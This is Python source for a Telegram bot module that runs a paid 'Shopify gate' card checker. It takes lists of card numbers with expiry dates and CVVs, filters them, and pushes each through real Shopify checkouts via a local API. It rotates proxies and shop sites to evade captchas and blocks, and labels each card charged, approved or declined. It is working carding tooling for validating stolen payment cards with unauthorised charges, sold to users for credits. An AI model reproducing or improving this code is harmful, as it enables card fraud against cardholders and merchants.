import asyncio
import aiohttp
import re
import time
import json
import html
import random
import logging
import os
import psycopg2.extras
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from html import escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, get_db_connection
from bin import get_bin_info
from sub import get_premium_status

_SHOPIFY_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_URL = "http://127.0.0.1:8080/shopii"

SITES_FILE = os.path.join(_SHOPIFY_DIR, "site.txt")

PROXY_LIST = []
try:
    with open(os.path.join(_SHOPIFY_DIR, "proxy.txt"), "r", encoding="utf-8", errors="ignore") as _pf:
        PROXY_LIST = [line.strip() for line in _pf if line.strip()]
except Exception:
    pass


MAX_MASS_CARDS = 50
PARALLEL_LIMIT = 25
MAX_RETRIES = 1
MAX_SITE_ROTATIONS = 20
UPDATE_EVERY = 10

SH_SESSIONS = {}

# Custom Emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"Error checking stats columns: {e}")

ensure_stats_columns()

def update_user_stats_sync(user_id, checked_count, charged_count):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET cc_checked = cc_checked + %s WHERE user_id = %s",
        (checked_count, user_id)
    )
    if charged_count > 0:
        cursor.execute(
            "UPDATE users SET cc_charged = cc_charged + %s WHERE user_id = %s",
            (charged_count, user_id)
        )
    conn.commit()
    conn.close()

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cursor.fetchone()
                conn.close()
                return row['plan'].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "FREE"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GENERAL HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

logger = logging.getLogger(__name__)

def load_sites() -> List[str]:
    try:
        if not os.path.exists(SITES_FILE):
            return []
        with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Error loading sites: {e}")
        return []

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        exp_year = int(yy)
        exp_month = int(mm)
        current_year = now.year % 100
        if exp_year < current_year:
            return True
        if exp_year == current_year and exp_month < now.month:
            return True
        return False
    except ValueError:
        return True

def parse_card(text: str) -> Optional[Tuple[str, str, str, str]]:
    text = text.strip()
    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        cc, mm, yy, cvv = match.groups()
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        return cc, mm, yy, cvv
    return None

def extract_cards(raw_text: str) -> List[str]:
    cards = []
    for line in raw_text.split('\n'):
        data = parse_card(line)
        if data:
            cc, mm, yy, cvv = data
            cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards[:MAX_MASS_CARDS]

def get_sort_priority(response_text: str) -> int:
    resp = response_text.upper()
    if any(k in resp for k in ["ORDER_PLACED", "CHARGED", "ORDER_PAID", "THANK YOU"]):
        return 1
    if "3DS" in resp or "3D_AUTH" in resp or "INSUFFICIENT_FUNDS" in resp or "INVALID_CVC" in resp:
        return 2
    return 3

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE CHECKING LOGIC (new API + proxy rotation)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Responses that mean "try a different site / proxy" — not a real card decline
ROTATION_TRIGGERS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'amount_too_small',
    'change proxy or site', 'token not found', 'invalid_response',
    'resolve', 'item', 'curl error', 'could not resolve host',
    'connect tunnel failed',
]

def categorize_result(resp_text: str, symbol: str) -> str:
    """Categorize result as 'charged', 'approved', 'declined', or 'error'"""
    lower = resp_text.lower()
    
    # Check if it's a site error (dead)
    if resp_text == "Dead / Site Error":
        return "error"
    
    # Check based on symbol and response text
    if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in symbol:
        return "charged"
    elif f'emoji-id="{CUSTOM_APPROVED_EMOJI_ID}"' in symbol:
        return "approved"
    else:
        return "declined"

async def check_card_logic(sites: List[str], cc: str) -> Dict:
    bin_num = cc.split('|')[0][:6]

    try:
        bin_data = await get_bin_info(bin_num)
        brand = (bin_data.get("scheme") or "N/A").title()
        issuer = bin_data.get("bank") or "N/A"
        country = bin_data.get("country") or "Unknown"
        flag = bin_data.get("country_emoji", "")
        bin_info = f"{issuer}|{country}{flag}"
    except Exception:
        brand = "N/A"
        bin_info = "Unknown|Unknown"

    declined_sym = f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'

    last_site = None

    for _ in range(MAX_SITE_ROTATIONS):
        # Pick a site different from the last one if possible
        candidates = [s for s in sites if s != last_site] or sites
        current_site = random.choice(candidates)
        last_site = current_site

        # Pick a random proxy each rotation
        proxy = random.choice(PROXY_LIST)

        for retry_idx in range(MAX_RETRIES + 1):
            try:
                timeout = aiohttp.ClientTimeout(total=30)
                params = {
                    "site": current_site,
                    "cc": cc,
                    "proxy": proxy,
                }
                async with aiohttp.ClientSession() as session:
                    async with session.get(API_URL, params=params, timeout=timeout) as resp:
                        if resp.status == 429:
                            if retry_idx < MAX_RETRIES:
                                await asyncio.sleep(1)
                                continue
                            break

                        text = await resp.text()
                        data = json.loads(text)

                        raw_resp = data.get("Response", "N/A")
                        raw_price = data.get("Price", "N/A")

                        display_resp = (
                            str(raw_resp)
                            .replace("\\", "")
                            .replace("/", "")
                            .replace('"', '')
                            .replace("'", "")
                        )

                        price_display = "N/A"
                        if raw_price not in ("N/A", None, ""):
                            try:
                                val = float(
                                    str(raw_price).replace("USD", "").replace("$", "").strip()
                                )
                                price_display = f"${val} USD"
                            except ValueError:
                                price_display = str(raw_price)

                        lower = display_resp.lower()

                        # Assign result symbol
                        if any(k in lower for k in ["thank you", "order_placed", "charged", "order_paid"]):
                            symbol = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">🔥</tg-emoji>'
                        elif any(k in lower for k in [
                            "3d_authentication", "3ds_required",
                            "insufficient_funds", "invalid_cvc",
                        ]):
                            symbol = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
                        else:
                            symbol = declined_sym

                        # If it's a rotation trigger, try next site
                        needs_rotation = any(t in lower for t in ROTATION_TRIGGERS)
                        if needs_rotation:
                            break  # break the retry loop, rotate site

                        return {
                            "card": cc,
                            "resp": display_resp,
                            "price": price_display,
                            "bin": bin_info,
                            "brand": brand,
                            "symbol": symbol,
                        }

            except aiohttp.ClientResponseError as e:
                if e.status == 429 and retry_idx < MAX_RETRIES:
                    await asyncio.sleep(1)
                    continue
                break
            except (asyncio.TimeoutError, aiohttp.ClientConnectorError):
                if retry_idx < MAX_RETRIES:
                    await asyncio.sleep(1)
                    continue
                break
            except json.JSONDecodeError:
                break

    return {
        "card": cc,
        "resp": "Dead / Site Error",
        "price": "N/A",
        "bin": bin_info,
        "brand": brand,
        "symbol": declined_sym,
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/sh"))
async def sh_command(message: types.Message):
    """Single Shopify card check. Uses site/proxy from files automatically."""
    user_id = message.from_user.id

    if not await asyncio.to_thread(is_gate_enabled, "sh"):
        await message.reply(
            "🚧 <b>𝗦𝗶𝗻𝗴𝗹𝗲 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>",
            parse_mode="HTML"
        )
        return

    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits < 1:
        await message.reply(
            "❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
            "You need at least <b>1 credit</b> to use this gate.",
            parse_mode="HTML"
        )
        return

    sites = load_sites()
    if not sites:
        await message.reply("❌ No sites found in <code>site.txt</code>.", parse_mode="HTML")
        return

    # ─── Collect one card from command text, reply, or .txt file ─────
    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1].strip() + "\n"

    if message.reply_to_message:
        replied = message.reply_to_message
        if replied.text:
            raw_text += replied.text + "\n"
        elif replied.caption:
            raw_text += replied.caption + "\n"

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document
    if document:
        try:
            file_info = await message.bot.get_file(document.file_id)
            byte_content = await message.bot.download_file(file_info.file_path)
            if byte_content:
                data = byte_content.read() if hasattr(byte_content, "read") else byte_content
                raw_text += data.decode("utf-8", errors="ignore")
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "⚠️ <b>Usage:</b>\n"
            "<code>/sh cc|mm|yy|cvv</code>\n"
            "or send a card / reply to a card with <code>/sh</code>",
            parse_mode="HTML"
        )
        return

    extracted = extract_cards(raw_text)
    if not extracted:
        await message.reply("❌ No valid card found.")
        return

    # ─── Validate and pick the first valid card ──────────────────────
    card = None
    for cc in extracted:
        p = cc.split('|')
        if len(p) < 4:
            continue
        cc_num, mm, yy, _ = p
        if not luhn_check(cc_num):
            continue
        if is_expired(mm, yy):
            continue
        card = cc
        break

    if not card:
        await message.reply("❌ No valid (Luhn + expiry) card found.")
        return

    status_msg = await message.reply(
        f"<pre>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗮𝗿𝗱...</pre>\n"
        f"<b>𝗖𝗮𝗿𝗱 ➠</b> <code>{card}</code>",
        parse_mode="HTML"
    )

    res = await check_card_logic(sites, card)

    text = (
        f"<b>𝗖𝗮𝗿𝗱 ➠</b> <code>{res.get('card', card)}</code>\n"
        f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➠</b> {res.get('resp', 'Unknown')}\n"
        f"<b>𝗣𝗿𝗶𝗰𝗲 ➠</b> {res.get('price', 'N/A')}\n"
        f"<b>𝗕𝗿𝗮𝗻𝗱 ➠</b> {res.get('brand', 'N/A')}\n"
        f"<b>𝗕𝗜𝗡 ➠</b> {res.get('bin', 'N/A')}\n"
        f"{res.get('symbol', '')}"
    )
    try:
        await status_msg.edit_text(text, parse_mode="HTML")
    except Exception:
        await message.reply(text, parse_mode="HTML")

    # ─── Deduct 1 credit for a real response ─────────────────────────
    if res.get("resp", "").lower() != "dead / site error":
        new_balance = max(0, (current_credits or 0) - 1)
        await asyncio.to_thread(update_credits, user_id, new_balance)
        await asyncio.to_thread(update_user_stats_sync, user_id, 1, 0)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC MASS CHECKER & UI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_statistics(results: List[Dict]) -> Dict[str, int]:
    """Calculate statistics from results"""
    stats = {
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    }
    
    for res in results:
        category = categorize_result(res.get("resp", ""), res.get("symbol", ""))
        if category in stats:
            stats[category] += 1
            
    return stats

async def run_sh_check(
    message: types.Message,
    sites: List[str],
    cards: List[str],
    user_name: str,
    user_id: int,
    is_premium: bool,
):
    start_time = time.time()
    total_cards = len(cards)
    #user_link = f"<a href='tg://user?id={user_id}'>{user_name}</a>"

    status_msg = await message.reply(
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➠ <code>{total_cards}</code>\n"
        f"𝗘𝗹𝗮𝗽𝘀𝗲𝗱 ➠ <code>0.0s</code>\n"
        #f"𝗨𝘀𝗲𝗿 ➠ {user_link}\n"
        #f"━━━━━━━━━━━━━━━━\n"
        f"<pre><b>𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸⌛...</b></pre>",
        parse_mode="HTML",
        disable_web_page_preview=True,
    )
    msg_id = status_msg.message_id

    SH_SESSIONS[msg_id] = {
        "gate_name": "sh",
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
    }

    sem = asyncio.Semaphore(PARALLEL_LIMIT)

    async def worker(cc: str):
        async with sem:
            return await check_card_logic(sites, cc)

    tasks = [asyncio.create_task(worker(cc)) for cc in cards]

    results = []
    pending = set(tasks)

    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
        for task in done:
            try:
                res = task.result()
                results.append(res)
            except Exception as e:
                logger.error(f"Worker error: {e}")

        results.sort(key=lambda x: get_sort_priority(x["resp"]))

        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            SH_SESSIONS[msg_id]["results"] = results
            SH_SESSIONS[msg_id]["elapsed_final"] = elapsed

            text = format_page_content(SH_SESSIONS[msg_id], elapsed, is_working=True)
            if len(results) < total_cards:
                text += f"\n\n<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(results)}/{total_cards}⌛...</b>"

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except Exception:
                pass

    elapsed_final = round(time.time() - start_time, 2)
    SH_SESSIONS[msg_id]["elapsed_final"] = elapsed_final

    # ─── Stats ───────────────────────────────────────────────────────
    charged_count = sum(
        1 for r in results
        if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in r.get("symbol", "")
    )
    await asyncio.to_thread(update_user_stats_sync, user_id, len(results), charged_count)

    # ─── Credit deduction: 1 credit per card checked ─────────────────
    # Only count cards that got a real API response (not pure site errors)
    real_checked = sum(
        1 for r in results if r.get("resp", "").lower() != "dead / site error"
    )
    if real_checked > 0:
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = max(0, current_credits - real_checked)
        await asyncio.to_thread(update_credits, user_id, new_balance)

    final_text = format_page_content(SH_SESSIONS[msg_id], elapsed_final, is_working=False)
    final_text += "\n\n✅ <b>𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"

    await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))


def format_page_content(state: Dict, elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page = state["page"]
    start_idx = page * 6
    page_results = results[start_idx: start_idx + 6]

    user_link = f"<a href='tg://user?id={state['user_id']}'>{state['user_name']}</a>"
    
    # Calculate statistics
    stats = get_statistics(results)
    
    # Format the header with statistics
    text = (
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➠ <code>{len(results)}/{state['total_cards']}</code>\n"
        f"𝘾𝙝𝙖𝙧𝙜𝙚𝙙 ➠ {stats['charged']}      𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ➠ {stats['approved']}\n"
        f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ➠ {stats['declined']}      𝙀𝙧𝙧𝙤𝙧 ➠ {stats['error']}\n"
        f"𝗧𝗶𝗺𝗲 ➠ <code>{elapsed}s</code>\n"
        f"━━━━━━━━━━━━━━━━"
    )

    # Add card results
    for res in page_results:
        safe_resp = html.escape(res.get("resp", "UNKNOWN"))
        text += (
            f"\n<code>{res['card']}</code>\n"
            f"<b>{safe_resp}</b> {res.get('symbol', '')} <b>{res.get('price', 'N/A')}</b>\n"
            f"<b>{res['bin']}</b>\n"
            f"━━━━━━━━━━━━━━━━"
        )
    
    # Add user at the end
    text += f"\n𝗨𝘀𝗲𝗿 ➠ {user_link}"

    return text


def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = SH_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages = (total + 5) // 6
    current = state["page"]

    row = []
    if current > 0:
        row.append(InlineKeyboardButton(text="◀ Back", callback_data=f"sh_prev_{msg_id}"))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next ▶", callback_data=f"sh_next_{msg_id}"))

    return InlineKeyboardMarkup(inline_keyboard=[row]) if row else None


@router.callback_query(F.data.startswith("sh_"))
async def sh_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        return
    try:
        msg_id = int(parts[2])
    except (ValueError, IndexError):
        return

    state = SH_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired.", show_alert=True)
        return

    if callback.from_user.id != state["user_id"]:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    await callback.answer()

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + 5) // 6

    if action == "next" and state["page"] < total_pages - 1:
        state["page"] += 1
    elif action == "prev" and state["page"] > 0:
        state["page"] -= 1

    elapsed = state.get("elapsed_final", round(time.time() - state["start_time"], 2))

    text = format_page_content(state, elapsed, is_working=False)
    if len(state["results"]) < state["total_cards"]:
        text += f"\n\n<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(state['results'])}/{state['total_cards']} ⌛...</b>"
    else:
        text += "\n\n✅ <b>𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except Exception:
        pass